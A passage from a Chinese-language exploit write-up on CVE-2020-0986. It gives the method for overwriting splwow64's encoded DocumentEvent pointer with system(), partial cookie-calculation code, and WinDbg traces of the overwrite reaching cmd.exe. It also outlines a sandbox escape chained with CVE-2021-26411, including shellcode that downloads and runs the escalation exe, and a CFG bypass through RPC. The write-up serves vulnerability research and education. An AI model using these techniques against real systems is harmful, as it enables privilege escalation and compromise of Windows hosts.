        `RtlpGetCookieValue'::`2'::CookieValue = v5;
      }
      return __ROR8__(v2 ^ v1, v1 & 0x3F);
    }
在splwow64.exe中，每一次执行DocumentEvent时，都先将fpDocumentEvent进行解码，从而得到原始的DocumentEvent函数指针，然后再进行调用，而fpDocumentEvent位于splwow64.exe进程的.data
段，也就是说fpDocumentEvent指针的偏移是确定的。
同时我们知道一个事实， Windows 系统上的地址空间布局随机化是基于引导的
，也就说当系统启动后，系统DLL的基址就不会改变，直到下次重启系统，所以在EXP中通过手动加载gdi32full.dll，就可以知道当前fpDocumentEvent指针的实际地址。
那么漏洞利用的思路就是，利用任意地址写的原语，将我们想要调用的函数指针，例如system函数指针，替换fpDocumentEvent函数指针，因为DocumentEvent函数在特定索引值的情况下，每次都会被调用，所以当我们替换成功后，实际调用的函数即为system。
漏洞利用简述步骤：
1.在调试环境下，确定fpDocumentEvent函数指针偏移，这里称为fpDocOffset。
2.在漏洞利用程序中，手动加载gdi32full.dll和winspool.drv，分别获得gdi32full.dll的BaseAddress和DocumentEvent函数指针。
3.发送LPC消息到splwow64.exe，获得BaseAddress+fpDocOffset地址处的fpDocumentEvent函数指针。
4.目前我们已经得到了fpDocumentEvent函数指针和DocumentEvent函数指针，也就是编码前后的函数指针，所以我们可以计算出编码所用的Cookie值，计算公式如下。(源自
@iamelli0t 师傅在看雪SDC的演讲PPT )
       UINT64 CalcCookie(UINT64 encodePtr, UINT64 decodePtr)
       {
           UINT cookie = 0;
           for (UINT i = 0; i  
       gdi32full!GdiPrinterThunk+0x2ac:
       00007ffa`c71a5c5c 488b0d85d51300  mov     rcx,qword ptr [gdi32full!fpDocumentEvent (00007ffa`c72e31e8)] ds:00007ffa`c72e31e8=07ffa3f668d74000
       0:006> ln 00007ffa`c72e31e8
       Browse module
       Set bu breakpoint
       (00007ffa`c72e31e8)   gdi32full!fpDocumentEvent   |  (00007ffa`c72e31f0)   gdi32full!fpQuerySpoolMode
       Exact matches:
       0:006> p
       gdi32full!GdiPrinterThunk+0x2b3:
       00007ffa`c71a5c63 48ff1536960a00  call    qword ptr [gdi32full!_imp_RtlDecodePointer (00007ffa`c724f2a0)] ds:00007ffa`c724f2a0={ntdll!RtlDecodePointer (00007ffa`c94477a0)}
       .........................................................
       .........................................................
       0:006> 
       gdi32full!GdiPrinterThunk+0x1fd4a:
       00007ffa`c71c56fa e834d5feff      call    gdi32full!memcpy (00007ffa`c71b2c33)
       0:006> r
       rax=0000000000a20800 rbx=0000000000a20160 rcx=0000000000a20060
       rdx=00007ffac72e31e8 rsi=0000000000a20088 rdi=0000000000cdca80
       rip=00007ffac71c56fa rsp=000000000267f280 rbp=000000000267f2e9
        r8=0000000000000008  r9=0000000000000100 r10=00000fff5920c6c0
       r11=000000000267f150 r12=0000000000000000 r13=0000000000000001
       r14=0000000000000010 r15=0000000000000000
       iopl=0         nv up ei ng nz ac po cy
       cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
       gdi32full!GdiPrinterThunk+0x1fd4a:
       00007ffa`c71c56fa e834d5feff      call    gdi32full!memcpy (00007ffa`c71b2c33)
       0:006> p
       gdi32full!GdiPrinterThunk+0x1fd4f:
       00007ffa`c71c56ff 90              nop
       0:006> dq 00000000`00a20060 l2
       00000000`00a20060  07ffa3f6`68d74000 00000000`00000000
2.将编码后fpSystem填充到BaseAddress+fpDocOffset地址处。
       0:006> 
       gdi32full!GdiPrinterThunk+0x1fd4a:
       00007ffa`c71c56fa e834d5feff      call    gdi32full!memcpy (00007ffa`c71b2c33)
       0:006> r
       rax=0000000000a20800 rbx=0000000000a20160 rcx=00007ffac72e31e8
       rdx=0000000000a20810 rsi=0000000000a20088 rdi=0000000000cdca80
       rip=00007ffac71c56fa rsp=000000000267f280 rbp=000000000267f2e9
        r8=0000000000000008  r9=0000000000000100 r10=00000fff5920c6c0
       r11=000000000267f150 r12=0000000000000000 r13=0000000000000001
       r14=0000000000000010 r15=0000000000000000
       iopl=0         nv up ei ng nz ac po cy
       cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
       gdi32full!GdiPrinterThunk+0x1fd4a:
       00007ffa`c71c56fa e834d5feff      call    gdi32full!memcpy (00007ffa`c71b2c33)
       0:006> dq 00007ffac72e31e8
       00007ffa`c72e31e8  07ffa3f6`68d74000 07ffa3f6`03994000
       00007ffa`c72e31f8  07ffa3f6`038b4000 07ffa3f6`6adf4000
       00007ffa`c72e3208  07ffa3f6`03a54000 07ffa3f6`0d254000
       00007ffa`c72e3218  07ffa3f6`0b0f4000 07ffa3f6`06d94000
       00007ffa`c72e3228  00080000`00000000 07ffa3f6`695f4000
       00007ffa`c72e3238  07ffa3f6`09a04000 07ffa3f6`6fd14000
       00007ffa`c72e3248  00000000`00000000 00000000`00000000
       00007ffa`c72e3258  00000000`00000000 ffffffff`ffffffff
       0:006> p
       gdi32full!GdiPrinterThunk+0x1fd4f:
       00007ffa`c71c56ff 90              nop
       0:006> dq 00007ffac72e31e8
       00007ffa`c72e31e8  07ffa46a`c7c34000 07ffa3f6`03994000
       00007ffa`c72e31f8  07ffa3f6`038b4000 07ffa3f6`6adf4000
       00007ffa`c72e3208  07ffa3f6`03a54000 07ffa3f6`0d254000
       00007ffa`c72e3218  07ffa3f6`0b0f4000 07ffa3f6`06d94000
       00007ffa`c72e3228  00080000`00000000 07ffa3f6`695f4000
       00007ffa`c72e3238  07ffa3f6`09a04000 07ffa3f6`6fd14000
       00007ffa`c72e3248  00000000`00000000 00000000`00000000
       00007ffa`c72e3258  00000000`00000000 ffffffff`ffffffff
3.最后再发送一次LPC消息，同时在LPC消息中包含system函数的参数，实现漏洞利用
       0:006> 
       gdi32full!GdiPrinterThunk+0x2ac:
       00007ffa`c71a5c5c 488b0d85d51300  mov     rcx,qword ptr [gdi32full!fpDocumentEvent (00007ffa`c72e31e8)] ds:00007ffa`c72e31e8=07ffa46ac7c34000
       0:006> ln 00007ffa`c72e31e8
       Browse module
       Set bu breakpoint
       (00007ffa`c72e31e8)   gdi32full!fpDocumentEvent   |  (00007ffa`c72e31f0)   gdi32full!fpQuerySpoolMode
       Exact matches:
       0:006> p
       gdi32full!GdiPrinterThunk+0x2b3:
       00007ffa`c71a5c63 48ff1536960a00  call    qword ptr [gdi32full!_imp_RtlDecodePointer (00007ffa`c724f2a0)] ds:00007ffa`c724f2a0={ntdll!RtlDecodePointer (00007ffa`c94477a0)}
       0:006> p
       gdi32full!GdiPrinterThunk+0x2ba:
       00007ffa`c71a5c6a 0f1f440000      nop     dword ptr [rax+rax]
       0:006> ln rax
       Browse module
       Set bu breakpoint
       (00007ffa`c8f87ec0)   msvcrt!system   |  (00007ffa`c8f87fe0)   msvcrt!capture_argv
       Exact matches:
       0:006> 
       gdi32full!GdiPrinterThunk+0x2bf:
       00007ffa`c71a5c6f 488b4f50        mov     rcx,qword ptr [rdi+50h] ds:00000000`00cdcad0=0000000000a20800
       0:006> 
       gdi32full!GdiPrinterThunk+0x2c3:
       00007ffa`c71a5c73 448b4f3c        mov     r9d,dword ptr [rdi+3Ch] ds:00000000`00cdcabc=00000020
       .........................................................
       .........................................................
       0:006> t
       ntdll!LdrpDispatchUserCallTarget:
       00007ffa`c946c590 4c8b1de9dd0e00  mov     r11,qword ptr [ntdll!LdrSystemDllInitBlock+0xb0 (00007ffa`c955a380)] ds:00007ffa`c955a380=00007df5fbab0000
       .........................................................
       .........................................................
       0:006> 
       ntdll!LdrpDispatchUserCallTarget+0x3b:
       00007ffa`c946c5cb 48ffe0          jmp     rax {msvcrt!system (00007ffa`c8f87ec0)}
       0:006> da rcx
       00000000`00a20200  "cmd.exe"
至此，我们已经完成的CVE-2020-0986的提权EXP编写。
## 结合CVE-2021-26411漏洞实现IE沙箱逃逸
参考 @iamelli0t师傅在看雪SDC的演讲，IE漏洞和提权漏洞结合流程如下：
  1. 利用IE漏洞实现RCE，执行的shellcode功能为，反射注入一个DLL。
  2. DLL的功能为远程下载并执行提权exe。
如上图所示，CVE-2021-26411配合CVE-2020-0986实现了沙箱逃逸，拿到Medium Integrity权限的shell。
## 题外话
CVE-2021-26411的[EXP](https://enki.co.kr/blog/2021/02/04/ie_0day.html)中使用Windows
RPC的方式绕过CFG，这种手法较为新颖，简单使用，
@iamelli0t师傅在他的[博客](https://iamelli0t.github.io/2021/04/10/RPC-Bypass-CFG.html)中也提到 “有理由相信，它将成为绕过 CFG 缓解的一种新的有效利用技术 ”。
CVE-2021-26411的EXP利用Windows RPC方式绕过CFG流程如下：
  1. 利用漏洞构造一个任意地址读写原语
  2. 替换虚表函数指针实现 JavaScript代码调用rpcrt4!NdrServerCall2 
  3. 伪造RPC_MESSAGE
  4. 利用JavaScript调用rpcrt4!NdrServerCall2，执行VirtualProtect，修改`RPCRT4!__guard_check_icall_fptr`的内存属性
  5. 替换ntdll!LdrpValidateUserCallTarget指针为KiFastSystemCallRet 
  6. 将第4步修改的内存属性改回原属性
  7. 利用JavaScript调用rpcrt4!NdrServerCall2执行shellcode
本人研究完
CVE-2021-26411的EXP后发现此EXP中使用的RPC手法是通用的，也就是说，在其他漏洞中只要能构造出任意地址读写原语，那一般都可以直接复用此RPC手法实现bypass
CFG，一番研究后，本人在CVE-2020-17053上实现了此RPC手法bypass CFG，这里就不再展示。
## 参考链接
[1]
[https://mp.weixin.qq.com/s?__biz=MzI1MDU5NjYwNg==&mid=2247489493&idx=1&sn=146720b9aa2c5d5b75679e1691cfe231&chksm=e9fe8a44de890352b91696cf57b30c8360f3ab2306ae2e779a5bd2325ef401d4aae5349efc93&scene=178&cur_album_id=1793105970730975235#rd](https://mp.weixin.qq.com/s?__biz=MzI1MDU5NjYwNg==&mid=2247489493&idx=1&sn=146720b9aa2c5d5b75679e1691cfe231&chksm=e9fe8a44de890352b91696cf57b30c8360f3ab2306ae2e779a5bd2325ef401d4aae5349efc93&scene=178&cur_album_id=1793105970730975235#rd)
[2] 
[3] 
[4]
[https://mp.weixin.qq.com/s?__biz=MzI1MDU5NjYwNg==&mid=2247489493&idx=1&sn=146720b9aa2c5d5b75679e1691cfe231&chksm=e9fe8a44de890352b91696cf57b30c8360f3ab2306ae2e779a5bd2325ef401d4aae5349efc93&scene=178&cur_album_id=1793105970730975235#rd](https://mp.weixin.qq.com/s?__biz=MzI1MDU5NjYwNg==&mid=2247489493&idx=1&sn=146720b9aa2c5d5b75679e1691cfe231&chksm=e9fe8a44de890352b91696cf57b30c8360f3ab2306ae2e779a5bd2325ef401d4aae5349efc93&scene=178&cur_album_id=1793105970730975235#rd)
[5] 
[6] 
[7] 
[8]
* * *